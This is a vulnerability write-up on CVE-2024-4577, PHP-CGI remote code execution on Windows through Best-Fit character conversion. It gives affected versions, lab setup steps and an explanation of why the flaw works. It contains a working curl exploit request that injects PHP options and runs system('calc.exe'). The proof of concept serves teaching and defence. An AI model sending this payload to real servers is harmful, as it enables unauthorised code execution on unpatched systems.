                           _________________

                             CVE-2024-4577
                            RCE via PHP-CGI

                                Hexdump
                           _________________


Table of Contents
_________________

1. Description
2. PoC
3. Why does it Work?
4. References


1 Description
=============

  When using Apache and PHP-CGI on Windows, if the system is set up to
  use certain code pages such as the Japanse code page, Windows may use
  "Best-Fit" behavior to replace characters in command line given to
  Win32 API functions. PHP CGI module may misinterpret those characters
  as PHP options, which may allow a malicious user to pass options to
  the PHP binary being run, allowing to achieve RCE.

  This vulnerability affects the following versions of PHP installed on
  the Windows operating system:

  -----------------------
   Affected PHP versions 
  -----------------------
   PHP 8.3 < 8.3.8       
   PHP 8.2 < 8.2.20      
   PHP 8.1 < 8.1.29      
  -----------------------


2 PoC
=====

  The setup works in three steps:

  1. The system locale of the operating system is changed to Japanese.

     ,----
     | Set-WinSystemLocale -SystemLocale "ja-JP"
     `----

     After the system locale has been changed, a restart is needed to
     apply the changes

     ,----
     | Restart-Computer
     `----

  2. A specific version of XAMPP is downloaded (8.1.25 / PHP 8.1.25)
     - <https://www.apachefriends.org/download.html>

     Check that the SHA1 fingerprint corresponds to
     `51535424fe7a89ed27e566ac4d357e9d7930cef4'

     ,----
     | Get-FileHash -Path .\xampp-windows-x64-8.1.25-0-VS16-installer.exe -Algorithm SHA1
     `----

     During the installation process, install only the `apache' and
     `php' components.

     After the installation has finished, start the XAMPP controller by
     executing the `xampp-control.exe' program within the main
     installation folder.

  3. Change the apache configuration (httpd-xampp.conf) and enable
     `PHP-CGI'.

  ----------------------------------------------------------------------

  The following request will exploit the vulnerability and trigger the
  RCE, spawning a `calc.exe` on the windows target. Change `<IP>` with
  the IP address of the server.

  ,----
  | curl -X POST "http://192.168.122.1/?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "<?php system('calc.exe');?>"
  `----


3 Why does it Work?
===================

  Internally Windows uses different encodings:

  - ANSI
  - UCS-2
  - UTF-16LE (Since Windows 2000)
  - UTF-8 (Since May, 2019)

  Depending on the APIs, the strings are handled differently:

  - GetEnvironmentVariableA, Single byte / ANSI
  - GetEnvironmentVariableW, Wide char / Unicode

  When a UTF-16 string is converted into an ANSI string, a specific
  behavior known as *Bestfit* is implemented by windows. During this
  character encoding conversion, certain characters that do not directly
  map to the target encoding can be replaced with the closest matching
  character.

  There is no specific formula for this, it's just about making the
  UNICODE and the ASCII character look alike.

  ----------------------------------------------------------------------

  CVE-2024-4577 is actually a bypass of CVE-2012-1823 fix.
  - <https://www.php.net/archive/2012.php#id2012-05-06-1>
  - <https://bugs.php.net/bug.php?id=61910>

  What the browser sees
  ,----
  | http://vuln.host/?%ADs
  `----

  What apache sees (soft-hypen)
  ,----
  | php-cgi.exe Â­s
  `----

  What php-cgi sees, after `GetCommandLineA()', which triggers
  `Bestfit'.
  ,----
  | php-cgi.exe -s
  `----

  ----------------------------------------------------------------------

  Consider the original payload

  ,----
  | curl -X POST "http://192.168.122.149/?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "<?php system('calc.exe');?>"
  `----

  ,----
  | %ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
  `----

  We have the following components:

  - `curl' command with typical `-X POST' flag

  - `url' of interest "<http://192.168.122.149/>?

  - The arguments start with `%AD', which is the soft hypen character
    (U+00AD). This is the character that will get maliciously
    "bestFitted" into the normal hyphen character.

  - Then we find the `allow_url_include=1', which enables the usage of
    php stream wrapper such as `php://input'.

  - Then we find the `auto_prepend_file=php://input', which tells the
    PHP interpreter to read raw POST data and include it into every
    script.

  - Finally, we find the `-d' which specicies the POST data itself,
    which in this case is a simple system to spawn a `calc.exe'

  ,----
  | -d allow_url_include=1 -d auto_prepend_file=php://input" -d "<?phpsystem('calc.exe');?>"
  `----


4 References
============

  - <https://nvd.nist.gov/vuln/detail/cve-2024-4577>
  - <https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/>
  - <https://worst.fit/assets/EU-24-Tsai-WorstFit-Unveiling-Hidden-Transformers-in-Windows-ANSI.pdf>
  - <https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/>
  - <https://github.com/watchtowrlabs/CVE-2024-4577>
